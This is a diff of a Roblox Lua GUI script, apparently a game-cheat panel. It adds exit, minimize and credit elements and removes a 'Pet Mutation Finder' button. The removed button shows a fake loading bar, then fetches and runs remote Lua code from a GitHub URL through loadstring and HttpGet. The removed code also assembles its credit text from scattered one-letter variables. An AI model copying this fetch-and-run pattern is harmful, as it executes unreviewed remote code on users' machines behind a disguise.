+	startAgeBtn.Text = "Start Age"
+	for i = 30, 1, -1 do
+		cooldownLabel.Text = "Cooldown: " .. i .. "s"
+		task.wait(1)
+	end
+	cooldownLabel.Text = "Cooldown: Ready"
+	agingCooldown = false
 end)
 
--- 💀 Pet Mutation Finder Button
-local mutationBtn = Instance.new("TextButton", frame)
-mutationBtn.Size = UDim2.new(1, -20, 0, 40)
-mutationBtn.Position = UDim2.new(0, 10, 0, 240)
-mutationBtn.BackgroundColor3 = Color3.fromRGB(216, 148, 169) -- Pink
-mutationBtn.Text = " 💀 Pet Mutation Finder"
-mutationBtn.TextSize = 16
-mutationBtn.Font = Enum.Font.FredokaOne
-mutationBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-mutationBtn.MouseButton1Click:Connect(function()
-
-    local Players = game:GetService("Players")
-    local TweenService = game:GetService("TweenService")
-    local RunService = game:GetService("RunService")
-    local player = Players.LocalPlayer
-
-    -- ScreenGui
-    local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-    screenGui.Name = "MutationLoader"
-
-    -- Main Frame
-    local loadingFrame = Instance.new("Frame", screenGui)
-    loadingFrame.Size = UDim2.new(0, 400, 0, 120)
-    loadingFrame.Position = UDim2.new(0.5, -200, 0.5, -60)
-    loadingFrame.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
-    loadingFrame.BorderSizePixel = 0
-    Instance.new("UICorner", loadingFrame).CornerRadius = UDim.new(0, 20)
-
-    -- Mutation Loading Label
-    local mainLabel = Instance.new("TextLabel", loadingFrame)
-    mainLabel.Size = UDim2.new(1, 0, 0.5, 0)
-    mainLabel.Position = UDim2.new(0, 0, 0, 0)
-    mainLabel.Text = "🧬 Mutation Finder Loading... 🧬"
-    mainLabel.Font = Enum.Font.Arcade
-    mainLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
-    mainLabel.TextStrokeTransparency = 0
-    mainLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
-    mainLabel.TextScaled = true
-    mainLabel.BackgroundTransparency = 1
-
-    -- Progress Bar Background
-    local progressBarBG = Instance.new("Frame", loadingFrame)
-    progressBarBG.Size = UDim2.new(0.9, 0, 0.2, 0)
-    progressBarBG.Position = UDim2.new(0.05, 0, 0.6, 0)
-    progressBarBG.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
-    progressBarBG.BorderSizePixel = 0
-    Instance.new("UICorner", progressBarBG).CornerRadius = UDim.new(0, 6)
-
-    -- Progress Bar Fill
-    local progressBar = Instance.new("Frame", progressBarBG)
-    progressBar.Size = UDim2.new(0, 0, 1, 0)
-    progressBar.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
-    progressBar.BorderSizePixel = 0
-    Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 6)
-
-    -- Evil Pulsing Effect
-    local pulseConnection
-    pulseConnection = RunService.RenderStepped:Connect(function()
-        local time = tick()
-        local pulse = (math.sin(time * 4) + 1) / 2
-        progressBar.BackgroundColor3 = Color3.fromRGB(200, 0 + pulse * 55, 0 + pulse * 55)
-    end)
-
-    -- Animate Loading
-    local tween = TweenService:Create(progressBar, TweenInfo.new(10, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-        Size = UDim2.new(1, 0, 1, 0)
-    })
-    tween:Play()
-
-    -- After loading
-    tween.Completed:Connect(function()
-        pulseConnection:Disconnect()
-        mainLabel.Text = "✅ Mutation System Loaded"
-        mainLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
-
-        wait(1)
-
-        local fadeTween = TweenService:Create(loadingFrame, TweenInfo.new(1), {
-            BackgroundTransparency = 1
-        })
-        fadeTween:Play()
-
-        fadeTween.Completed:Connect(function()
-            screenGui:Destroy()
-            -- ✅ Correct loadstring goes here
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/munkizzzz/test-script/refs/heads/main/Mutation-test.lua"))()
-        end)
-    end)
-
+------------------------------------------------------------------
+-- ❌ Exit Button -----------------------------------------------
+------------------------------------------------------------------
+local exitButton = Instance.new("TextButton", mainFrame)
+exitButton.Size = UDim2.new(0, 24, 0, 24)
+exitButton.Position = UDim2.new(1, -28, 0, 2)
+exitButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+exitButton.Text = "X"
+exitButton.TextColor3 = Color3.new(1, 1, 1)
+exitButton.TextScaled = true
+exitButton.Font = Enum.Font.GothamSemibold
+exitButton.BorderSizePixel = 0
+Instance.new("UICorner", exitButton).CornerRadius = UDim.new(0, 6)
+exitButton.MouseButton1Click:Connect(function()
+	gui:Destroy()
 end)
 
-local b4, b5, b6 = "i", "z", "z"
-local c1 = "z"
+------------------------------------------------------------------
+-- 🗕 Minimize & Restore GUI --------------------------------------
+------------------------------------------------------------------
+local minimized = false
+local minimizeButton = Instance.new("TextButton", mainFrame)
+minimizeButton.Size = UDim2.new(0, 24, 0, 24)
+minimizeButton.Position = UDim2.new(1, -56, 0, 2)
+minimizeButton.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
+minimizeButton.Text = "_"
+minimizeButton.TextColor3 = Color3.new(1, 1, 1)
+minimizeButton.TextScaled = true
+minimizeButton.Font = Enum.Font.GothamSemibold
+Instance.new("UICorner", minimizeButton).CornerRadius = UDim.new(0, 6)
 
-local credit = Instance.new("TextLabel", frame)
-credit.Size = UDim2.new(1, 0, 0, 20)
-credit.Position = UDim2.new(0, 0, 0, 22)
-credit.BackgroundTransparency = 1
-credit.Font = Enum.Font.FredokaOne
-credit.TextSize = 14
-credit.TextColor3 = Color3.fromRGB(200, 200, 200)
-credit.Text = a1..a2..a3..a4..a5..a6..a7..a8..a9..b1..b2..b3..b4..b5..b6..c1
+-- Minimized GUI icon
+local miniFrame = Instance.new("Frame", gui)
+miniFrame.Size = UDim2.new(0, 120, 0, 30)
+miniFrame.Position = UDim2.new(0, 10, 0.85, 0)
+miniFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+miniFrame.Visible = false
+Instance.new("UICorner", miniFrame).CornerRadius = UDim.new(0, 8)
+
+local restoreButton = Instance.new("TextButton", miniFrame)
+restoreButton.Size = UDim2.new(1, 0, 1, 0)
+restoreButton.Text = "Open GUI"
+restoreButton.BackgroundTransparency = 1
+restoreButton.TextColor3 = Color3.new(1, 1, 1)
+restoreButton.TextScaled = true
+restoreButton.Font = Enum.Font.GothamSemibold
+
+-- Toggle minimize
+minimizeButton.MouseButton1Click:Connect(function()
+	if not minimized then
+		mainFrame.Visible = false
+		miniFrame.Visible = true
+		minimized = true
+	end
+end)
+
+-- Restore GUI
+restoreButton.MouseButton1Click:Connect(function()
+	mainFrame.Visible = true
+	miniFrame.Visible = false
+	minimized = false
+end)
+
+------------------------------------------------------------------
+-- 📝 Footer / Credit --------------------------------------------
+------------------------------------------------------------------
+local footer = Instance.new("TextLabel", mainFrame)
+footer.Size = UDim2.new(1, 0, 0, 18)
+footer.Position = UDim2.new(0, 0, 1, -20)
+footer.BackgroundTransparency = 1
+footer.Text = "credit Zein Corte"
+footer.TextColor3 = Color3.fromRGB(200, 200, 200)
+footer.Font = Enum.Font.GothamSemibold
+footer.TextSize = 10
+footer.TextWrapped = true
